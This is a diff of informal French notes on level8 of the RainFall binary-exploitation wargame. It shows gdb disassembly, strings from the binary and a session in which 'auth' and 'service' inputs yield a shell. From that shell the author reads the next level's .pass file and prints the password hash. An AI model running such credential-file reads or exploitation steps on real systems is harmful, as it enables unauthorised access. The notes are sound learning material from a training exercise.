@@ -1,3 +1,8 @@
+A garder//
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+//
+
 quand on lance le ex il prend des valeurs mais dans tous les cas il ecrit 
 (nil), (nil) 
 donc je vais regarder le gdb
@@ -14,3 +19,60 @@ on voit que c variable son respectivement service et auth
 0x8049ab0 <service>:     ""
 (gdb) x/s 0x8049aac
 0x8049aac <auth>:        ""
+
+alors la ce sont des bonne info ca veut dire en gros qu'il y a une comparaison avec 32 bits 0x20 et si 
+0x080486e7 <+387>:   mov    0x20(%eax),%eax
+0x080486ea <+390>:   test   %eax,%eax
+0x080486ec <+392>:   je     0x80486ff <main+411>
+0x080486ee <+394>:   movl   $0x8048833,(%esp)
+0x080486f5 <+401>:   call   0x8048480 <system@plt>
+
+bon bon bon vous savez quoi j'ai appris pas mal de chose un peu tard mais pas grave regarder moi c video 
+https://www.youtube.com/watch?v=VroEiMOJPm8
+https://www.youtube.com/watch?v=3NTXFUxcKPc
+
+deja avec ca j'ai compris comment bien comprendre le code
+et j'ai compris que si je faisais vim ./level8 je trouve pas mal de truc sympa comme 
+@%p, %p
+^@auth ^@reset^@service^@login^@/bin/sh^@Password:
+
+alors petite deduction 
+%p et %p c pour le printf du coup je regarde ce que (nil) veut dire car il printf %p %p
+ok nil et le null ou le 0 de s et d
+
+pour le rest je pense que c des:
+if auth ...
+if resest ...
+if service ...
+if login ...
+
+je vais tester
+du coup on a ca 
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth
+(nil), (nil) 
+auth q
+0x804a008, (nil) 
+login
+Password:
+0x804a008, (nil) 
+service q
+0x804a008, 0x804a018 
+login
+Password:
+0x804a008, 0x804a018 
+
+et en voulant copier le resulta je me suis fail je les copier dans la console et ca a marcher 
+je sais pas comment et pour quoi mais ca a marcher
+
+$ quit
+/bin/sh: 8: quit: not found
+$ ^C
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+bon cherchon auqnd meme mais a vue d'oeil le login pass de write Password a bin/sh a une condition
+
+on avait vue qu'il fallait 32 bits pour activer une condition du coup j'ai aussi vue qu'il verifier 
